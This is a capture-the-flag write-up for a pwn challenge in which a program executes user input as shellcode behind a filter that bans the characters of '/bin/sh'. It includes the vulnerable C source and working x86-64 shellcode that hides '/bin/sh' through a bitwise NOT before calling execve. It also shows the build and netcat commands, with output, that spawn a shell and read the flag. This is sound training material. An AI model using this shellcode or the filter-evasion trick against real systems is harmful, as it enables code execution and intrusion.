# [PWN] executor

## Vulnerability

Shellcode injection

# Source

```c
int main(void) {
  init();
  char *shellcode =
      mmap(NULL, SHELLCODE_MAX, PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  printf("WHOM SHALL I EXECUTE FIRST: ");
  fgets(shellcode, SHELLCODE_MAX - 1, stdin);
  run_filter(shellcode);
  ((void (*)())shellcode)();
  return EXIT_SUCCESS;
}
```

```c
void run_filter(char *shellcode) {
  char *banned = "/bin/sh";
  for (int i = 0; i < strlen(banned); i++) {
    void *location = memchr(shellcode, banned[i], SHELLCODE_MAX - 1);
    if (location != NULL) {
      puts("I AM SO DONE WITH YOU ALL JUST SPAMMING /bin/sh PAYLOADS. THAT IS "
           "BANNED. COME UP WITH A NEW SHELLCODE IF YOU WANT THE FLAG");
      exit(EXIT_FAILURE);
    }
  }
}

```

## Exploit

Here the malicious user input is directly executed as a function by the program. So the goal is simple, come up with a shellcode.



Problem? `run_filter` is the main obstacle. It not only blocks the standard `/bin/sh` based payload, but it also blocks every single payload which contains any character of `/bin/sh`.



Solution? There can be multiple solutions, creativity is the key.

Here's my intended solutions

1. Avoid /bin/sh altogether and use it open->read->write flag.txt sequence.

2. Use clever dynamic construction like `not 0xff978cd091969dd0` which would convert to `/bin/sh` at runtime.

```nasm
global _start

section .text

_start:
        ;    int3
        mov  rdi, 0xff978cd091969dd0
        not  rdi
        push rdi
        mov  rdi, rsp
        mov  rsi, 0
        mov  rdx, 0
        mov  rax, 59
        syscall

```

```shell
➜  executor nasm -f elf64 solution.asm -o solution.o
➜  executor objcopy --dump-section .text=raw solution.o
➜  executor cat raw - | nc <server_ip> 50000
WHOM SHALL I EXECUTE FIRST:
ls
executor flag.txt
cat flag.txt
DJSISACA{Y0U_4r3_4_sh3lLc0d1N9_pR0}
```

## Flag

`DJSISACA{Y0U_4r3_4_sh3lLc0d1N9_pR0}`
